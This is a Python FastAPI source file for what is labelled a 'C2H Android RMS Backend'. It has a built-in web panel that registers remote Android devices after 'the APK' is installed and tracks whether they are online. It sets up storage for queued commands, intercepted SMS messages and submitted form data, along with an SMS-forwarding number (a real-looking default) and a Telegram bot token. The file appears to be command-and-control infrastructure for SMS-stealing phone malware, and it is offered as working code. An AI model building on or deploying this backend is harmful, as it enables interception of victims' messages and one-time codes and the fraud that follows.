import uvicorn
from fastapi import FastAPI, HTTPException, Request
from fastapi.responses import HTMLResponse
from pydantic import BaseModel
from typing import List, Optional, Dict, Any
from datetime import datetime, timedelta, timezone
import sqlite3
import json
import os

# --- Configuration ---
DATABASE_URL = "rms.db"
ONLINE_THRESHOLD_SECONDS = 20

# --- Database Initialization ---
def get_db_connection():
    conn = sqlite3.connect(DATABASE_URL, check_same_thread=False)
    conn.row_factory = sqlite3.Row
    return conn

def now_utc_string():
    return datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")

def init_db():
    conn = get_db_connection()
    cursor = conn.cursor()
    
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS devices (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT UNIQUE NOT NULL,
            device_name TEXT,
            os_version TEXT,
            phone_number TEXT,
            battery_level INTEGER,
            last_seen DATETIME NOT NULL,
            created_at DATETIME NOT NULL
        );
    """)
    
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS commands (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT NOT NULL,
            command_type TEXT NOT NULL,
            command_data TEXT NOT NULL,
            status TEXT NOT NULL DEFAULT 'pending',
            created_at DATETIME NOT NULL
        );
    """)

    cursor.execute("""
        CREATE TABLE IF NOT EXISTS sms_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT NOT NULL,
            sender TEXT NOT NULL,
            message_body TEXT NOT NULL,
            received_at DATETIME NOT NULL
        );
    """)

    cursor.execute("""
        CREATE TABLE IF NOT EXISTS form_submissions (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT NOT NULL,
            custom_data TEXT NOT NULL,
            submitted_at DATETIME NOT NULL
        );
    """)

    cursor.execute("""
        CREATE TABLE IF NOT EXISTS global_settings (
            setting_key TEXT PRIMARY KEY UNIQUE NOT NULL,
            setting_value TEXT
        );
    """)
    
    # Default settings
    cursor.execute("INSERT OR IGNORE INTO global_settings (setting_key, setting_value) VALUES (?, ?)",
                  ('sms_forward_number', '9923255555'))
    cursor.execute("INSERT OR IGNORE INTO global_settings (setting_key, setting_value) VALUES (?, ?)",
                  ('telegram_bot_token', ''))
    cursor.execute("INSERT OR IGNORE INTO global_settings (setting_key, setting_value) VALUES (?, ?)",
                  ('telegram_chat_id', ''))
    
    conn.commit()
    conn.close()

init_db()

# --- Pydantic Models ---
class DeviceRegisterRequest(BaseModel):
    device_id: str
    device_name: Optional[str] = None
    os_version: Optional[str] = None
    phone_number: Optional[str] = None
    battery_level: Optional[int] = None

class DeviceResponse(BaseModel):
    device_id: str
    device_name: Optional[str] = None
    os_version: Optional[str] = None
    phone_number: Optional[str] = None
    battery_level: Optional[int] = None
    is_online: bool
    created_at: str
    last_seen: str

class SmsForwardConfigRequest(BaseModel):
    forward_number: str

class TelegramConfigRequest(BaseModel):
    telegram_bot_token: str
    telegram_chat_id: str

class SendCommandRequest(BaseModel):
    device_id: str
    command_type: str
    command_data: Dict[str, Any]

class FormSubmissionRequest(BaseModel):
    custom_data: str

class SmsLogRequest(BaseModel):
    sender: str
    message_body: str

# --- FastAPI Application ---
app = FastAPI(title="C2H Android RMS Backend")

# --- API Endpoints ---
@app.get("/", response_class=HTMLResponse)
async def get_panel():
    """मुख्य पैनल पेज - सीधा HTML return कर रहा है"""
    return HTMLResponse(content="""
<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>📱 Device Control Panel</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1400px;
            margin: 0 auto;
        }
        h1 {
            color: white;
            margin-bottom: 30px;
            font-size: 2.5em;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.2);
        }
        .config-section {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 20px;
            margin-bottom: 40px;
        }
        .config-card {
            background: white;
            padding: 25px;
            border-radius: 20px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .config-card h3 {
            color: #333;
            margin-bottom: 15px;
        }
        .config-card input {
            width: 100%;
            padding: 12px;
            margin: 8px 0;
            border: 2px solid #e0e0e0;
            border-radius: 10px;
        }
        .config-card button {
            width: 100%;
            padding: 12px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 10px;
            cursor: pointer;
        }
        h2 {
            color: white;
            margin: 30px 0 20px;
        }
        .device-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
            gap: 20px;
        }
        .device-card {
            background: white;
            border-radius: 20px;
            padding: 20px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
            cursor: pointer;
            border-left: 5px solid #4caf50;
        }
        .device-card.offline {
            border-left-color: #f44336;
        }
        .status {
            padding: 5px 10px;
            border-radius: 20px;
            font-size: 0.85em;
            font-weight: bold;
        }
        .online .status { background: #4caf50; color: white; }
        .offline .status { background: #f44336; color: white; }
        .battery {
            display: flex;
            align-items: center;
            gap: 10px;
            margin: 15px 0;
        }
        .battery-bar {
            flex: 1;
            height: 10px;
            background: #e0e0e0;
            border-radius: 5px;
            overflow: hidden;
        }
        .battery-level {
            height: 100%;
            background: #4caf50;
            border-radius: 5px;
        }
        .no-devices {
            grid-column: 1 / -1;
            text-align: center;
            padding: 50px;
            background: white;
            border-radius: 20px;
            color: #666;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>📱 Device Control Panel</h1>
        
        <div class="config-section">
            <div class="config-card">
                <h3>📨 SMS Forward Number</h3>
                <input type="text" id="smsNumber" placeholder="Enter phone number">
                <button onclick="updateSMSNumber()">Update</button>
            </div>
            <div class="config-card">
                <h3>🤖 Telegram Config</h3>
                <input type="text" id="botToken" placeholder="Bot Token">
                <input type="text" id="chatId" placeholder="Chat ID">
                <button onclick="updateTelegram()">Update</button>
            </div>
        </div>
        
        <h2>📱 Registered Devices <span id="deviceCount">(0)</span></h2>
        <div id="deviceGrid" class="device-grid">
            <div class="no-devices">
                <h3>No devices registered yet</h3>
                <p>Install the APK on a device to see it here</p>
            </div>
        </div>
    </div>

    <script>
        async function loadDevices() {
            try {
                const res = await fetch('/api/devices');
                const devices = await res.json();
                document.getElementById('deviceCount').textContent = `(${devices.length})`;
                
                let html = '';
                devices.forEach(device => {
                    const statusClass = device.is_online ? 'online' : 'offline';
                    html += `
                        <div class="device-card ${statusClass}">
                            <div style="display:flex;justify-content:space-between">
                                <span class="device-name">${device.device_name || 'Unknown'}</span>
                                <span class="status">${device.is_online ? 'ONLINE' : 'OFFLINE'}</span>
                            </div>
                            <div class="battery">
                                <span>🔋</span>
                                <div class="battery-bar">
                                    <div class="battery-level" style="width: ${device.battery_level}%;"></div>
                                </div>
                                <span>${device.battery_level}%</span>
                            </div>
                            <div>📱 ${device.os_version || 'Android'}</div>
                            <div>📞 ${device.phone_number || 'No number'}</div>
                            <div style="font-size:0.85em;color:#999;margin-top:10px">
                                Last seen: ${device.last_seen || 'Never'}
                            </div>
                        </div>
                    `;
                });
                document.getElementById('deviceGrid').innerHTML = html || '<div class="no-devices">No devices yet</div>';
            } catch (error) {
                console.error('Error:', error);
            }
        }

        async function updateSMSNumber() {
            const number = document.getElementById('smsNumber').value;
            if (!number) return alert('Please enter a number');
            
            const res = await fetch('/api/config/sms_forward', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({forward_number: number})
            });
            if (res.ok) alert('✅ Updated successfully!');
        }

        async function updateTelegram() {
            const data = {
                telegram_bot_token: document.getElementById('botToken').value,
                telegram_chat_id: document.getElementById('chatId').value
            };
            
            const res = await fetch('/api/config/telegram', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(data)
            });
            if (res.ok) alert('✅ Updated successfully!');
        }

        async function loadConfig() {
            try {
                const smsRes = await fetch('/api/config/sms_forward');
                const smsData = await smsRes.json();
                document.getElementById('smsNumber').value = smsData.forward_number || '';
                
                const telRes = await fetch('/api/config/telegram');
                const telData = await telRes.json();
                document.getElementById('botToken').value = telData.telegram_bot_token || '';
                document.getElementById('chatId').value = telData.telegram_chat_id || '';
            } catch (error) {
                console.error('Error loading config:', error);
            }
        }

        loadDevices();
        loadConfig();
        setInterval(loadDevices, 5000);
    </script>
</body>
</html>
    """)

@app.post("/api/device/register")
async def register_device(data: DeviceRegisterRequest):
    conn = get_db_connection()
    cursor = conn.cursor()
    current_time_str = now_utc_string()
    clean_device_id = data.device_id.strip()

    cursor.execute("SELECT id FROM devices WHERE device_id = ?", (clean_device_id,))
    device = cursor.fetchone()
    
    if device:
        cursor.execute(
            "UPDATE devices SET device_name=?, os_version=?, phone_number=?, battery_level=?, last_seen=? WHERE device_id=?",
            (data.device_name, data.os_version, data.phone_number, data.battery_level, current_time_str, clean_device_id)
        )
    else:
        cursor.execute(
            "INSERT INTO devices (device_id, device_name, os_version, phone_number, battery_level, last_seen, created_at) VALUES (?, ?, ?, ?, ?, ?, ?)",
            (clean_device_id, data.device_name, data.os_version, data.phone_number, data.battery_level, current_time_str, current_time_str)
        )
        
    conn.commit()
    conn.close()
    return {"status": "success"}

@app.get("/api/devices", response_model=List[DeviceResponse])
async def get_devices():
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM devices ORDER BY last_seen DESC")
    devices = cursor.fetchall()
    response_list = []
    current_time_utc = datetime.now(timezone.utc)
    for device in devices:
        try:
            last_seen_dt = datetime.strptime(device['last_seen'], "%Y-%m-%d %H:%M:%S").replace(tzinfo=timezone.utc)
        except:
            last_seen_dt = current_time_utc - timedelta(days=1)
        is_online = (current_time_utc - last_seen_dt).total_seconds() < ONLINE_THRESHOLD_SECONDS
        response_list.append(DeviceResponse(
            device_id=device['device_id'],
            device_name=device['device_name'] or "Unknown",
            os_version=device['os_version'] or "Unknown",
            phone_number=device['phone_number'] or "No Number",
            battery_level=device['battery_level'] or 0,
            is_online=is_online,
            created_at=device['created_at'],
            last_seen=device['last_seen']
        ))
    conn.close()
    return response_list

@app.post("/api/config/sms_forward")
async def update_sms_forward_config(data: SmsForwardConfigRequest):
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("INSERT OR REPLACE INTO global_settings (setting_key, setting_value) VALUES (?, ?)",
                  ('sms_forward_number', data.forward_number))
    conn.commit()
    conn.close()
    return {"status": "success"}

@app.post("/api/config/telegram")
async def update_telegram_config(data: TelegramConfigRequest):
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("INSERT OR REPLACE INTO global_settings (setting_key, setting_value) VALUES (?, ?)",
                  ('telegram_bot_token', data.telegram_bot_token))
    cursor.execute("INSERT OR REPLACE INTO global_settings (setting_key, setting_value) VALUES (?, ?)",
                  ('telegram_chat_id', data.telegram_chat_id))
    conn.commit()
    conn.close()
    return {"status": "success"}

@app.get("/api/config/sms_forward")
async def get_sms_forward_config():
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("SELECT setting_value FROM global_settings WHERE setting_key = ?", ('sms_forward_number',))
    result = cursor.fetchone()
    conn.close()
    return {"forward_number": result['setting_value'] if result else ""}

@app.get("/api/config/telegram")
async def get_telegram_config():
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("SELECT setting_key, setting_value FROM global_settings WHERE setting_key IN ('telegram_bot_token', 'telegram_chat_id')")
    results = {row['setting_key']: row['setting_value'] for row in cursor.fetchall()}
    conn.close()
    return {
        "telegram_bot_token": results.get('telegram_bot_token', ''),
        "telegram_chat_id": results.get('telegram_chat_id', '')
    }

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8000))
    uvicorn.run("main:app", host="0.0.0.0", port=port)
